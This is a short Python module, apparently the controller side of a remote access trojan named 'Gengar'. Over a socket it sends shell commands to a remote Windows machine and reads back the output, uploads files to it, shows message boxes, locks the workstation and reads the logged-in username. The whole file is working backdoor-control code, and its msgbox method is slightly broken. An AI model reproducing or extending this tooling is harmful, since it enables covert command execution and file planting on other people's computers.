import struct
import os
from enum import Enum
import json
import time

import output


class CommandTypes:
    SHELL = b'\x00'
    MSGBOX = b'\x01'
    UPLOAD = b'\x02'
    DOWNLOAD = b'\x03'


class Gengar:
    def __init__(self, sock):
        self._sock = sock

    def shell(self, cmd):
        print(f'Running: {cmd}')
        payload = b''.join([CommandTypes.SHELL, cmd.encode()])
        self._sock.send(payload)
        return self._sock.recv(8192).decode().strip()

    def upload(self, local_path, remote_path):
        print(f'Uploading {local_path} to {remote_path}')
        payload = b''.join([
            CommandTypes.UPLOAD,
            remote_path.ljust(1024, '\x00').encode(),
            struct.pack('Q', os.path.getsize(local_path))
        ])
        self._sock.send(payload)
        with open(local_path, 'rb') as _file:
            while True:
                buf = _file.read(8192)
                if buf:
                    self._sock.send(buf)
                else:
                    break

    def msgbox(self, content):
        self._sock.send((CommandTypes.MSGBOX + content).encode())

    def lock_workstation(self):
        print('Locking workstation')
        self.shell('rundll32 user32.dll,LockWorkStation')

    def username(self):
        return self.shell('echo %username%')

    def is_alive(self):
        try:
            self.shell('test')
            return True
        except ConnectionResetError:
            return False

    def __repr__(self):
        return f'Gengar at {self.username()}'
